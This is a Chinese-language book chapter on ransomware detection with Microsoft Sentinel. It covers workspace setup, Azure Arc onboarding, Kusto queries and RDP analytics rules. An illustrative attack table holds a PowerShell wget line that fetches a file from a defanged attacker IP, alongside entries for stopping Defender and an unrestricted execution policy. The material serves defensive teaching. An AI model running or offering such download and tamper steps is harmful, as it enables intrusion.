  \n如前所述，Sentinel 在 Log Analytics 之上计费，并且由于 Sentinel 专注于安全事件和异常流量模式的监控，因此一个良好的最佳实践是确定应将何种数据放在\
  \ Sentinel Log Analytics 工作区中。\n\n例如，PaaS 的性能指标可能不应该存储在 Sentinel Log Analytics 工作区中，因为它与服务或系统的性能相关信息，从安全角度来看没有提供太多价值；它只会增加成本。\n\
  \n总体建议是尽可能少地拥有 Log Analytics 工作区，但至少每个地理区域有一个——一个启用了 Sentinel 的工作区用于收集与安全相关的事件，以及一个或多个工作区用于收集非安全事件，例如性能指标和/或应用程序数据。\n\
  \n例如，假设你有两个工作区，其中一个启用了 Sentinel，另一个用于通用应用程序日志记录和性能指标。在这里，你可以配置称为 DCRs 的内容，在其中确定\
  \ VM 上的何种日志和事件应存储在哪些工作区中，如下图所示。\n\n\n\n\n\nDCRs 提供了更大的灵活性，因为它们允许我们定义想要收集的日志类型以及存储位置。当我们配置\
  \ DCR 时，它还会自动在引用的对象上安装 Azure Monitor Agent：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_86_0.png)\n\
  \n图 3.2 – Azure 中的 DCR\n\n对于 Azure 中的 PaaS，您可以配置诊断设置，在其中指定应将哪些数据源发送到不同的 Log Analytics\
  \ 工作区。\n\n除了在工作区级别定义的保留期外，您还可以在表级别定义保留期。所有工作区都由不同的表组成，具体取决于收集的数据类型，如果连接新的数据源，新的表将自动创建。使用\
  \ ARMClient 通过 REST API 指定表级别的保留期。这提供了更大的灵活性。例如，如果我们想将表保留期设置为 7 天，也可以通过门户完成。表级别保留允许您例如指定性能数据仅存储\
  \ 7 天而不是 90 天，而 90 天是存储在 Sentinel 中的数据的默认保留期。\n\n如果您想为每个表定义自定义保留期，可以进行此定义，但它在 Azure\
  \ 门户中不可直接使用。\n\n要为每个表配置自定义保留期，您需要直接使用 Azure Resource Manager (ARM) API 进行更改，使用名为\
  \ ARMClient 的 CLI 工具，可以从此处下载：https://github.com/projectkudu/ARMClient。\n\n要更改表的保留时间，例如\
  \ SecurityEvents 表，请执行以下操作：\n\n+   1. 运行客户端，使用以下命令将客户端与 Microsoft Azure 进行身份验证：\n\
  \n```\narmclient.exe azlogin\n```\n+   2. 通过浏览器使用有权访问环境的帐户进行身份验证。\n+   3. 使用以下命令检查给定表的保留期：\n\
  \n```\narmclient.exe get /subscriptions/subscriptionid/resourceGroups/resourcegroupname/providers/Microsoft.OperationalInsights/workspaces/loganalyticsworkspace/Tables/SecurityEvents?api-version=2017-04-26-preview\n\
  ```\n+   4. 确保将订阅 ID、资源组名称和 Log Analytics 工作区表名称替换为您自己的。\n\n> **注意**\n> 您将在本章后面学习如何创建该服务。\n\
  \n默认情况下，保留时间为 30 天。\n\n+   5. 要更改保留时间，我们需要更改命令以发送包含更改的 HTTP 正文。此示例将 SecurityEvents\
  \ 的保留时间更改为 7 天：\n\n```\narmclient put /subscriptions/subscriptionid/resourceGroups/resourcegroup/providers/Microsoft.OperationalInsights/workspaces/workspacename/Tables/SecurityEvent?api-version=2017-04-26-preview\"\
  \ \"{properties: {retentionInDays: 7}}\"\n```\n\n在这里，我们设置了 Microsoft Sentinel 和\
  \ Log Analytics 工作区，并配置了 Azure Arc，以便我们可以管理我们拥有的 Windows VM。然后，我们配置了 Azure Monitor\
  \ Agent 并定义了我们想要收集的日志数据源。\n\n需要注意的是，要完成本节，您需要一个有效的 Microsoft Azure 订阅。这也可以通过设置 Azure\
  \ 试用帐户来完成，可以在此处设置：https://azure.microsoft.com/en-us/offers/ms-azr-0044p/。\n\n实现\
  \ Microsoft Sentinel 可以使用不同的方法：\n\n+   - 使用 Azure CLI 或 PowerShell 的 CLI\n+   -\
  \ **基础设施即代码 (IaC)** – Terraform、Bicep 或原生 ARM 模板，如我在博客中所示，其中展示了 PowerShell 和 Terraform\
  \ 设置示例；我们将在下一节中也展示这一点：https://msandbu.org/automating-azure-sentinel-deployment-using-terraform-and-powershell/\n\
  +   - 通过 Azure 门户（使用 Microsoft Azure 的示例可以在此处找到：https://learn.microsoft.com/en-us/azure/sentinel/quickstart-onboard）\n\
  \n这里使用的示例基于 PowerShell 的使用，这要求您拥有一台支持 PowerShell 模块的计算机。\n\n首先，我们需要安装一些模块，以便通过 PowerShell\
  \ 与 Microsoft Azure 交互：\n\n+   1. 安装 Azure PowerShell 模块，您可以从此网站下载：https://learn.microsoft.com/en-us/powershell/azure/install-az-ps。\n\
  +   2. 接下来，我们需要安装一些额外的模块，这些模块将直接从 PowerShell 运行这些命令进行安装。此模块允许我们从 PowerShell 配置 Azure\
  \ Monitor 和 Microsoft Sentinel。使用 Install-Module 命令安装以下模块：\n+   3. 最后，您可以使用 Get-InstalledModule\
  \ 命令并指定模块名称，以查看其是否已成功安装，如以下屏幕截图所示：\n\n```\nInstall-Module -Name Az.SecurityInsights\n\
  Install-Module -Name Az.MonitoringSolutions.\n```\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_88_0.png)\n\
  \n安装完这些模块后，我们需要连接到 Azure 环境以继续配置。从 PowerShell 运行 Connect-AzAccount 命令。这将触发浏览器窗口打开；从那里，您需要使用有权访问\
  \ Azure 订阅的帐户进行身份验证。\n\n现在，我们将创建不同的资源，例如资源组，这是一个逻辑容器，我们将在其中放置 Log Analytics 工作区和\
  \ Sentinel 模块。以下示例基于名为 sentinel-rg 的资源组，并将放置在 Azure 西欧区域。您可以根据自己的喜好更改名称和区域：\n\n\
  ```\nNew-azresourcegroup -name \"sentinel-rg\" -location \"west europe\"\nNew-azoperationalinsightsworkspace\
  \ -name la-sentinel-we001 -resourcegroupname \"sentinel-rg\" -location \"west europe\"\
  \n$id = Get-AzOperationalInsightsWorkspace -Name\n```\n\n```\nla-sentinel-we001\
  \ -ResourceGroupName sentinel-rg\nNew-AzMonitorLogAnalyticsSolution -Type SecurityInsights\n\
  -ResourceGroupName sentinel-rg -location \"west europe\"\n-WorkspaceResourceId $id.ResourceId\n\
  ```\n\n如果这些命令运行成功，您应该在 Microsoft Azure 中创建了 Microsoft Sentinel 工作区。您可以使用相同的凭据登录\
  \ https://portal.azure.com 以验证工作区是否已成功创建。然后，在中间的搜索窗口中输入 Sentinel – 您应该会看到创建的工作区，如以下屏幕截图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_89_0.png)\n\n图 3.4 – Azure 门户中的 Microsoft\
  \ Sentinel\n\n使用 PowerShell 模块，我们还可以配置不同的分析规则和 DCR。DCR 允许我们定义应从不同 VM 收集何种类型的数据。\n\
  \n最后，我们应该收集工作区 ID 和稍后用于将机器加入 Sentinel 的主密钥。您可以使用以下 PowerShell 命令收集这些信息（如果您使用的是与之前相同的示例）。工作区\
  \ ID 和主密钥用于将代理加入以将日志数据收集到 Log Analytics。\n\n从这两个命令中，我们需要复制出 PrimarySharedKey 和 CustomerId\
  \ 属性：\n\n```\nGet-AzOperationalInsightsWorkspaceSharedKey -ResourceGroupName \"\
  sentinel-rg\" -Name \"la-sentinel-we001\"\nGet-AzOperationalInsightsWorkspace -ResourceGroupName\
  \ \"sentinel-rg\" -Name \"la-sentinel-we001\"\n```\n\n在下一节中，我们将重点介绍从我们将用于构建分析规则的\
  \ VM 上加入日志数据。\n\n如果您想从本地或 Azure 外部运行的 VM 收集日志，可以在受支持期间使用常规 Log Analytics 代理，或使用\
  \ Azure Arc 代理。Azure Arc for Servers 除了日志收集外还提供一系列独特功能，例如补丁管理、策略和期望状态配置。\n\n在示例中，我将向您展示如何使用\
  \ Azure Arc 与 Azure Monitor 收集 Windows 的安全事件，我们将在 Microsoft Sentinel 中使用这些事件来分析异常流量模式和事件。\n\
  \n需要注意的是，Azure Arc 代理以及随服务提供的其他受支持功能需要通过 443 端口与 Microsoft Azure 进行出站连接。\n\n在开始安装\
  \ Azure Arc 代理之前，我们将在 Azure 中创建一个新的资源组，所有 Arc 代理都将位于其中。您可以使用 Azure 门户或以下 PowerShell\
  \ 命令创建新的资源组：\n\n```\nNew-azresourcegroup -name \"arc-comp-001\" -location \"west\
  \ europe\"\n```\n\n接下来，我们需要在 Azure 环境中注册一些新的资源提供程序。注册资源提供程序只是允许我们为订阅访问 Azure Arc\
  \ 功能。\n\n在现有连接中在 PowerShell 中运行这些命令：\n\n```\nRegister-AzResourceProvider -ProviderNamespace\
  \ Microsoft.HybridCompute\nRegister-AzResourceProvider -ProviderNamespace Microsoft.GuestConfiguration\n\
  Register-AzResourceProvider -ProviderNamespace Microsoft.HybridConnectivity\n```\n\
  \n最后，我们还应安装 Azure Arc 的 PowerShell 模块，该模块允许我们轻松管理 Arc 启用 VM 上的扩展。您可以使用以下 PowerShell\
  \ 命令安装此模块：\n\n```\nInstall-Module -Name Az.ConnectedMachine\n```\n\n我们还需要创建一个部署脚本，用于加入机器。进入\
  \ Azure 门户，在顶部搜索窗口中输入 Azure Arc，如以下屏幕截图所示：\n\n\n图3.6 – Azure门户中的Azure Arc\n\n在Azure门户中进入Azure\
  \ Arc服务，点击“服务器”，然后点击“添加”。现在，您会看到用于生成加入脚本的不同选项。加入操作既可以通过交互式登录每台服务器的手动方式进行，也可以创建用于部署的自定义服务主体。\n\
  \n在本示例中，我们将使用单台服务器，因此请在门户中的“添加单台服务器”选项下点击“生成脚本”按钮。\n\n然后，您需要完成向导，该向导将创建加入脚本，并选择先前创建的资源组。\n\
  \n您还必须定义一个区域；此区域并不反映实际日志数据的存储位置，而仅代表逻辑计算机对象。所有数据都将存储在先前创建的Log Analytics工作区中。\n\n\
  然后，定义连接方法，可以是公共、代理或通过专用终结点。最后一个选项仅在您已通过VPN或ExpressRoute等方式与Azure建立连接时才可用。\n\n选择“公共”，点击“下一步”，然后定义标签，如位置或数据中心。这些标签将自动应用于Azure中的每个计算机资源。然后，点击“下一步”，复制向导中生成的脚本，脚本应类似于：\n\
  \n注册请求已提交（这可能需要几分钟时间）\n\n## 2. 下载或复制以下脚本\n\n```\n### Download the installation package\n\
  Invoke-WebRequest -Uri \"https://aka.ms/azcmagent-windows\" -TimeoutSec 30 -OutFile\
  \ \"$env:TEMP\\install_windows_azcmagent.ps1\"\n\n### Install the hybrid agent\n\
  & \"$env:TEMP\\install_windows_azcmagent.ps1\"\nif($LASTEXITCODE -ne 0) {\n    throw\
  \ \"Failed to install the hybrid agent\"\n}\n\n### Run connect command\n& \"$env:ProgramW6432\\\
  AzureConnectedMachineAgent\\azcmagent.exe\" connect --resource-group \"arc-comp-001\"\
  \ --tenant-id \"2c2d79bd-1c3f-448c-8479-3c0a19c98c6e\" --location \"westeurope\"\
  \ --subscription-id \"...\" --cloud \"AzureCloud\" --correlation-id \"762ea005-36ce-4e58-a939-ea00461cc000\"\
  \n\nif($LastExitCode -eq 0){Write-Host -ForegroundColor yellow \"To view your onboarded\
  \ server(s), navigate to https://portal.azure.com/#blade/HubsExtension/BrowseResource/resourceType/Microsoft.HybridCompute%2Fmachines\"\
  }\n```\n\n图3.7 – Azure Arc向导配置\n\n然后，在要加入的计算机上打开PowerShell并运行该脚本。运行脚本时，系统会要求您使用有权访问该订阅的用户登录Microsoft\
  \ Azure以完成安装。\n\n安装代理后，可以通过运行以下PowerShell命令来验证其是否已连接：\n\n```\nGet-AzConnectedMachine\n\
  ```\n\n它应显示您加入的计算机。您也可以返回Azure门户，在“Azure Arc”和“服务器”下查看该计算机。\n\n接下来，我们需要将计算机加入，以便向Sentinel工作区发送数据，这可以通过向已加入Azure\
  \ Arc的计算机添加扩展来完成。扩展是使用Azure Arc代理安装在计算机上的加载项。要安装扩展，我们需要先前收集的workspacekey和workspaceid属性，这些属性将作为变量传递给命令。\n\
  \n以下代码中引用的workspacekey和workspaceid仅作为示例；您应根据自己的位置、资源组、计算机名称、主共享密钥和工作区ID修改脚本：\n\n\
  ```\n$Setting = @{\n  \"workspaceid\" = \"bd28c551-c805-476d-92f2-9f1cf98f8c81de\"\
  \n}\n$protectedSetting = @{\n  \"workspacekey\" =\n```\n\n```\n```powershell\n\"\
  9KtRbA+ZwojksqV2YvD/QHOuBMR4iRP8nk1s8BIGYQtJkQ/ekw6DZ3UUASetPbhQZnmCxQyQUX0zFSc4ccjM5w==\"\
  \ }\nNew-AzConnectedMachineExtension -Name MicrosoftMonitoringAgent\n-ResourceGroupName\
  \ \"arc-comp-001\" -MachineName \"wapp-no-001\"\n-Location \"west europe\" -Publisher\
  \ \"Microsoft.EnterpriseCloud.\nMonitoring\" -Settings $Setting -ProtectedSetting\n\
  $ProtectedSetting -ExtensionType \"MicrosoftMonitoringAgent\"\n```\n```\n\n运行此命令后，可能需要一些时间才能完成。验证扩展是否已安装并开始收集数据的最简单方法是进入Azure门户，然后进入**Azure\
  \ Arc**视图，在**服务器**下查看。然后，点击VM资源并点击门户中的**扩展**视图。\n\n在那里，您应该会看到状态为**成功**的Microsoft\
  \ Monitoring Agent。如果您点击**日志**，应该会看到一些日志源的表视图。\n\n现在，最后一部分是在Microsoft Sentinel中设置数据连接器以收集安全事件。不幸的是，这不能通过API和PowerShell完成。虽然我们可以使用PowerShell配置DCR，但我们将介绍如何使用UI配置数据连接器。\n\
  \n您可以在`https://learn.microsoft.com/en-us/azure/sentinel/data-connectors-reference`查看当前支持的数据连接器。\n\
  \nMicrosoft提供了广泛的连接器，可简化将数据源集成到Sentinel的过程，包括以下内容：\n\n- Azure AD\n- Office 365\n\
  - 安全事件（Windows安全事件）\n- Azure防火墙\n\n添加数据连接器时，在大多数情况下，它会包括数据集成、搜寻和分析规则，这些规则可以使用但默认情况下未启用，最后还包括可用于可视化数据的工作簿。\n\
  \n进入Azure门户，在中间的搜索面板中键入`Microsoft Sentinel`。然后，点击新创建的工作区。\n\n在Sentinel的**概述**页面上，您将看到不同的选项，例如日志事件和安全事件，而在左侧，您将看到一个菜单，如下面的屏幕截图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_95_0.png)\n\n图3.8 – Microsoft Sentinel概述\n\
  \nSentinel包含许多功能，因此我想就门户中可用的不同选项写一些简短的说明。以下是本章稍后将配置的一些设置：\n\n- **事件**：包含Sentinel中分析规则创建的所有安全事件。这些可能来自预定义查询或其他Microsoft安全产品的安全警报。\n\
  - **工作簿**：包含与已配置的不同数据源相关的仪表板。提供了一种轻松可视化所收集特定数据的视图。\n- **搜寻**：包含搜寻查询，让您可以轻松查找环境中的特定活动。此处包含的查询也来自已配置的数据连接器。\n\
  - **笔记本**：包含Jupyter Notebook，允许我们对连接的数据运行基于Python的脚本。\n- **实体行为**：包含一个仪表板，用于显示与已配置实体相关的历史记录。\n\
  \n在此向导中，点击**创建数据收集规则（DCR）**。为规则提供名称，并选择将存储DCR的资源组。点击**下一步**。在**资源**下，您可以选择是将此DCR应用于将加入订阅的所有计算机，还是指定资源组中可用的自定义计算机。选择一台已安装Azure\
  \ Arc代理的VM，然后点击**收集**。在这里，您可以根据三个定义的级别指定要收集的安全事件类型：\n\n- **所有安全事件**\n- **常见**\n\
  - **最小**\n\n此网站包含与每个安全事件级别收集的不同事件ID相关的参考：`https://docs.microsoft.com/en-us/azure/sentinel/windows-security-event-id-reference`。\n\
  \n在大多数情况下，我倾向于选择**常见**，其中包含最必要的安全事件。选择级别后，点击**下一步**，直到进入**查看并创建**部分，然后点击**创建**。\n\
  \nDCR完成后，连接器页面应反映正在收集数据，并在连接器列表中显示连接器状态，如下面的屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_97_0.png)\n\
  \n图3.9 – Sentinel中的数据连接器\n\n创建DCR规则后，下次Azure Monitor Agent连接到Azure时，它将看到一组已更新的规则，并会下载这些规则开始处理。\n\
  \n它可能需要几分钟才能完成处理并开始上传数据。我们可以通过进入Sentinel中的**日志**窗格来验证是否正在收集数据。然后，在左侧，我们可以点击**安全和审核**类别，并在其下双击**SecurityEvent**。这将把表名填充到右侧的搜索窗格中。完成后，点击**运行**——您应该会看到从计算机收集的一些事件，如下面的屏幕截图所示：\n\
  \n\n\n\n\n## 执行 Kusto 和日志查询\n\nSentinel 将数据存储在工作区中，工作区是一个数据库，我们可以使用一种名为 Kusto 的查询语言来分析这些数据，Kusto\
  \ 是一种只读的 SQL 查询语言。\n\nKusto 语法简单；你定义想要搜索的数据源和要应用的筛选器，以及可以根据数据源对某些属性进行包含或排除的不同筛选器应用的位置。\n\
  \n到目前为止，我们已在 SecurityEvents 表中收集了数据，该表包含此处列出的属性：https://docs.microsoft.com/en-us/azure/azure-monitor/reference/tables/securityevent。\
  \ 需要注意的是，对于每个表，可用的属性会有所不同。 可用数据取决于启用和配置了哪些类型的数据连接器。\n\n> **注意**\n> 默认情况下，存储在工作区中的所有数据均设置为只读，因此你无法通过\
  \ UI 从工作区中删除数据。 但是，有一个 Purge API 允许你删除工作区中的某些条目。 你可以在此处阅读有关如何使用 API 的更多信息：https://docs.microsoft.com/en-us/rest/api/loganalytics/workspace-purge/purge。\n\
  \n如果我们想在 Security Events 表中查找某个 Event ID，可以使用以下查询：\n\n```\nSecurityEvent\n| where\
  \ EventID == 4625\n```\n\n这将列出包含特定 Event ID 的所有事件。 我们还可以进一步自定义查询，以查看特定时间范围。 我只需附加此筛选器即可在特定时间范围内查找：\n\
  \n```\n| where TimeGenerated > datetime(2022-03-10) and TimeGenerated < datetime(2022-03-12)\n\
  ```\n\nKusto 在添加选择器方面提供了许多不同的功能，这些选择器允许你在结果中筛选数据或添加外部数据源以丰富数据集。 你也可以在此处找到与本书相关的更多\
  \ Kusto 运算符和查询示例：https://github.com/PacktPublishing/Windows-Ransomware-Detection-and-Protection/tree/main/chapter3。\n\
  \n如果你想了解有关如何使用 Kusto 的更多信息，可以在此处了解更多信息：https://docs.microsoft.com/en-us/azure/sentinel/kusto-overview。\n\
  \n重要的是要理解，当我们构建分析规则时，计划的 Kusto 查询会在特定时间内查找特定活动。 我们还必须确定该查询需要多少结果才会触发 Sentinel 警报。\n\
  \n因此，Sentinel 中的大部分工作都涉及构建良好的 Kusto 查询，这些查询将用于运行分析规则。 你对 Kusto 越熟练，Sentinel 在查找数据中的异常行为方面就越强大。\n\
  \n不过，我想在这里展示一些示例查询，以便让你了解其功能以及如何使用不同的筛选器和使用外部数据丰富数据集。\n\n默认情况下，Kusto 不会增强收集的数据源；因此，例如，SecurityEvents\
  \ 表不包含与国家/地区相关的任何信息。 如果我们有一台 VM 不断被暴力破解，并且我们想确定攻击 IP 地址的位置，我们可以使用外部 IP 源：\n\n```\n\
  let geoData = externaldata\n(network:string,geoname_id:string,continent_code:string,continent_name:string,\n\
  \  country_iso_code:string,country_name:string,is_anonymous_proxy:string,is_satellite_provider:string)\n\
  [@\"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv\"\
  ] with (ignoreFirstRecord=true, format=\"csv\");\nSecurityEvent\n| where EventID\
  \ == \"4625\"\n| evaluate ipv4_lookup (geoData, IpAddress, network, false)\n| summarize\
  \ count() by IpAddress, country_name\n```\n\n此示例查询首先定义一个变量，其中包含网络、geoname、国家代码等不同属性。\
  \ 然后，它对 HTTPS 端点执行外部调用并收集 CSV 文件，然后将该文件映射到属性中。\n\n然后，我们查找 SecurityEvent 表，其中我们查找事件\
  \ ID 为 4625 的事件，这是有人登录失败时生成的事件 ID。 然后，我们使用名为 ipv4_lookup 的 evaluate 运算符，其中我们将 IP\
  \ 地址和 CSV 中的地理数据源位置映射到 SecurityEvent 表中的 IpAddress 属性，并查看是否匹配。\n\nMicrosoft 还推出了一个名为\
  \ Kusto Detective Agency 的新的交互式 Kusto 学习方式，它为你提供了预定义的用例，让你学习 Kusto。 你可以在此处找到它：https://detective.kusto.io/。\n\
  \n然后，我们使用 summarize 运算符来获取登录尝试的总计数，如以下示例屏幕截图所示：\n\n```\nlet geoData = externaldata\n\
  (network: string, geoname_id: string, continent_code: string, continent_name: string,\n\
  country_iso_code: string, country_name: string, is_anonymous_proxy: string,\nis_satellite_provider:\
  \ string)\n[@\"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv\"\
  ]\nwith (ignoreFirstRecord=true, format=\"csv\");\nSecurityEvent\n| where EventID\
  \ == \"4625\"\n| evaluate ipv4_lookup (geoData, IPAddress, network, false)\n| summarize\
  \ count() by IPAddress, country_name\n| render piechart\n```\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_101_0.png)\n\
  \n图 3.11 – Microsoft Sentinel 中登录尝试的地理查找\n\n## 看到全貌\n\n如第 1 章《勒索软件攻击和威胁态势》中所述，在勒索软件攻击或初步评估期间，勒索软件操作员可能会在受损的端点或服务上使用许多不同的工具和脚本，以尝试获得进一步的访问权限。\n\
  \n仅通过查看安全事件中的异常登录流量，你将无法获得足够的数据来全面了解正在发生的事情。\n\n例如，SecurityEvent 表包含与使用帐户名和 IP 地址的登录尝试相关的信息。\
  \ 但是，它不包含有关发出调用的进程或尝试来自何种端口的任何信息；其次，它不包含有关某人获得访问权限后发生的情况的任何信息，例如他们是否在机器上运行任何命令、脚本或可执行文件。\n\
  \n为了获得全面的概述，我们需要多个不同的数据源，以便能够更早地检测攻击，使威胁狩猎更容易，并确定正常行为或模式。\n\n例如，仅此安全事件仅告诉我们有人已成功登录：\n\
  \n### 事件 ID：4624 – IP 地址 80.66.76.145 – 帐户已成功登录\n\n但是，如果我们使用多个数据源，我们可以看到同一时期从该 IP\
  \ 地址运行的整个事件系列。\n\n以下表中的信息来自不同的数据源：VM 连接来自 VM insights，这需要安装 Azure Monitor Agent；依赖项代理需要一些额外的配置才能收集。\
  \ 然后，我们有来自我们之前配置的数据连接器的安全事件。 此外，对于配置了 Microsoft Defender for Servers 的设备，我们有设备文件事件。\
  \ 该表包含有关机器上运行的所有进程和已下载文件的信息。 这对于查看例如某人是否在机器上本地运行脚本很有用。 最后，我们有一个来自更改跟踪功能的配置更改。 这对于检测\
  \ Windows 机器上注册表、文件或服务的更改很有用。\n\n收集的数据存储在不同的表中并包含不同的数据。 你可以在此处了解有关收集了哪些数据的更多信息：https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/tables-category。\n\
  \n以下信息是虚构的，但它展示了拥有不同的数据收集以能够看到发生的一切的价值：\n\n| 来源 | VM 连接 | 安全事件 | 设备文件事件 | 配置更改 |\
  \ 设备进程事件 |\n|---|---|---|---|---|---|\n| 活动 | 80.66.76.145<br>入站<br>3389<br>svchost<br>俄罗斯\
  \ | 80.66.76.145<br>4624 - 帐户已成功登录。 | PowerShell wget hxxp://209.14.0[.]234:46613/VcEt\
  \ rKighyIFS5foGNXH -file *.zip | 服务<br>已停止<br>MsSenseS | powershell.exe<br>ExecutionPolicy<br>不受限制<br>非交互式\
  \ |\n\n图 3.12 – 来自 Sentinel 日志源的数据概览\n\n\n\n\n\n要获得此视图，我们需要在 Microsoft Sentinel\
  \ 中收集的其他数据源也需要启用：\n\n- **VM 连接：** 这提供了对网络连接的洞察。将它映射到机器上的运行进程，还可以显示流量是传出还是传入。这需要启用\
  \ VM insights 扩展。\n- **设备文件事件：** 这需要与 Microsoft Defender for Servers 集成并安装代理。\n\
  - **配置更改：** 这需要与 Azure Automation 集成，可监控注册表、进程甚至文件的更改。\n- **设备进程事件：** 这需要与 Microsoft\
  \ Defender for Servers 集成并安装代理。\n\n我们将在 *Detecting vulnerabilities with Defender*\
  \ 部分稍后回到 Microsoft Defender；不过，我们可以更仔细地查看如何在我们的 Azure Arc VM 上启用 VM insights 扩展。\n\
  \n启用 VM insights 可以使用 PowerShell、Azure Policy 或 Azure 门户完成。为简单起见，我们将使用 PowerShell。\n\
  \n这可以通过在机器上安装依赖项代理来完成。此依赖项代理将继承现有 Monitor Agent 的所有配置，因此你只需安装代理，它就会开始收集数据：\n\n```\n\
  Invoke-WebRequest \"https://aka.ms/dependencyagentwindows\"\n-OutFile InstallDependencyAgent-Windows.exe\n\
  .\\InstallDependencyAgent-Windows.exe /S\n```\n\n需要注意的是，启用 VM insights 会产生大量日志数据，具体取决于机器进出流量的多少。由于它可能为\
  \ Log Analytics 产生高昂成本，因此请谨慎启用。\n\n安装代理后，几分钟后，你将在 Sentinel 工作区中看到一些新表正在生成，例如 VMComputer、VMConnection\
  \ 和 VMProcess。你也可以通过转到 **Monitoring** 选项卡下的 **Insights** 来查看概览，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_103_0.png)\n\
  \n图 3.13 – 为 Azure Arc 机器启用 VM insights\n\n使用此数据的一种简单方法是查看对 VM 的传入连接。进入 Azure 门户，然后\
  \ Microsoft Sentinel，单击 Logs。在那里，双击 VMConnection 表并输入以下 Kusto 查询：\n\n```\nVMConnection\n\
  | where Direction == \"inbound\"\n| summarize count() by DestinationPort\n```\n\n\
  这是一个简单的查询，它将查看数据集并查找传入连接，并根据传入端口进行汇总。\n\n至此，我们更详细地了解了如何扩展日志记录功能，以获得有关进入 VM 的流量流的更多洞察。现在，让我们迈出下一步，看看如何使用信息构建分析规则在\
  \ Microsoft Sentinel 中触发事件或警报。\n\n## 创建分析规则和处理事件\n\n现在数据来源已在 Sentinel 中收集，我们需要定义一些逻辑来查找异常模式，如果发现这些模式，将会生成事件。\n\
  \n在 Microsoft Sentinel 中，事件是基于分析规则创建的。这些规则可以分为三种类型：\n\n- 定时查询规则\n- Microsoft 事件创建规则（Security\
  \ Graph API）\n- 异常规则\n\n如果我们创建定时查询规则，我们需要定义一个将在预定义计划上运行的 Kusto 查询。此外，在查询中，我们必须定义一个阈值，如果与\
  \ Kusto 查询匹配，则如果达到阈值，将会生成事件。\n\n我们还拥有 Microsoft 事件创建规则，这些是来自 Security Graph API\
  \ 的其他 Microsoft 安全产品发出的警报。这些可以来自 Azure AD Identity Protection、Microsoft Defender\
  \ for Cloud、Microsoft Defender for Endpoint、Defender for Identity 等警报，然后也会自动在 Sentinel\
  \ 中创建。\n\n最后一个是基于异常的查询规则，它基于机器学习算法。我们这里的重点将基于定时查询规则，在其中我们需要定义自定义逻辑。\n\n一旦分析规则触发，它也可以用于触发自动化规则，这些规则基于\
  \ Microsoft Azure 中的 Logic Apps：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_105_0.png)\n\
  \n图 3.14 – Microsoft Sentinel 中分析规则的概览\n\n在开始构建分析规则之前，还有一个最终概念我们需要理解，那就是实体。使用 Sentinel，你可以从许多不同的来源摄取数据。在处理所有不同类型的数据时，一些信息在不同来源中是相同的，但以不同的属性呈现。\n\
  \n让我分享一个例子。如以下屏幕截图所示，我们有两个不同的表。一个是 SecurityEvents，它收集来自 Windows 事件引擎的安全日志的信息。该日志源收集诸如失败的登录尝试等信息，并将尝试登录的主机\
  \ IP 地址收集在 IpAddress 属性下。然后，我们有 VMConnection 数据源，它也收集大部分相同的信息，但从进程视图查看流量。此数据源还收集与尝试连接的\
  \ IP 地址相关的信息，但存储在 SourceIP 属性下：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_106_0.png)\n\
  \n图 3.15 – Microsoft Sentinel 中的实体匹配\n\nMicrosoft Sentinel 使用实体来匹配它识别的数据并将其分类到同一事件中，例如，并进入实体历史记录。对于此示例，IpAddress\
  \ 和 SourceIp 数据项都应匹配到 Sentinel 中的同一实体——即 Host\n\n实体用作事件的参考点，并在 Sentinel 中处理事件时允许你查看实体历史记录。\n\
  \nMicrosoft 支持广泛的不同实体，你可以使用；更多信息可在此处找到：https://docs.microsoft.com/en-us/azure/sentinel/entities。\n\
  \n这些实体也可以在实体行为仪表板中轻松引用，在那里你可以查找实体的历史记录，例如 IP 地址、主机名和用户名，如以下屏幕截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_106_1.png)\n\
  \n图 3.16 – Microsoft Sentinel 中的实体仪表板\n\n通过能够跟踪先前与安全警报关联的 IP 地址或用户等实体，我们可以深入了解潜在的安全风险。现在我们了解了数据如何被收集和保存，我们可以建立监控准则。\n\
  \n## 分析规则\n\n让我们开始构建自己的分析规则。对于此示例，我将使用 Azure 门户，并在最后提供 PowerShell 示例。\n\n如第 1 章\
  \ Ransomware Attack Vectors and the Threat Landscape 中所述，勒索软件攻击的典型入口点可以基于 RDP 连接。我想创建两个不同的分析规则，它们将使用两个数据源来查看来自一个在互联网上通过\
  \ RDP 公开可用的虚构机器的入侵迹象：\n\n- 安全事件（从 Azure Monitor 中的 DCR 收集）\n- VM insights（从依赖项代理收集）\n\
  \n为此示例起见，我们将查找 RDP 成功连接的尝试，并基于此创建警报规则。我们还将排除已知 IP 地址，以便不会为已知流量创建警报规则。\n\n首先进入 Azure\
  \ 门户，然后 Microsoft Sentinel，然后进入 Analytics 选项卡。从那里，单击 Create Scheduled Query Rule，这将启动向导。\n\
  \n然后，在向导的第一部分输入以下信息：\n\n- **名称：** Successful Logon RDP - Security Events\n- **描述：**\
  \ 查找入侵迹象，即有人已成功使用 RDP 登录到机器\n- **战术和技术：** 初始访问（T1078）和暴力破解（T1110）\n- **严重性：** 中等\n\
  - **状态：** 已启用\n\n此信息可在以下屏幕截图所示中看到：\n\n\n\n### Analytics rule wizard - Create a new\
  \ scheduled rule\n\nHome > Microsoft Sentinel > Microsoft Sentinel >\n\nGeneral\
  \   Set rule logic   Incident settings   Automated response   Review and create\n\
  \nCreate an analytics rule that will run on your data to detect threats.\n\n## Analytics\
  \ rule details\n\nName *\nSuccessful Logon RDP - Security Events\n\nDescription\n\
  Looking for signs of compromise where someone has successfully logged onto a machine\
  \ with RDP\n\nTactics and techniques\n2 selected\n\nSeverity\nMedium\n\nStatus\n\
  Enabled Disabled\n\nFigure 3.17 – Analytics rule wizard in Microsoft Sentinel\n\n\
  The tactics and techniques are mapped to the MITRE framework, which you can read\
  \ more about here: https://attack.mitre.org/techniques/T1021/001/. Microsoft has\
  \ a detailed reference sheet regarding Event ID that contains different descriptions:\
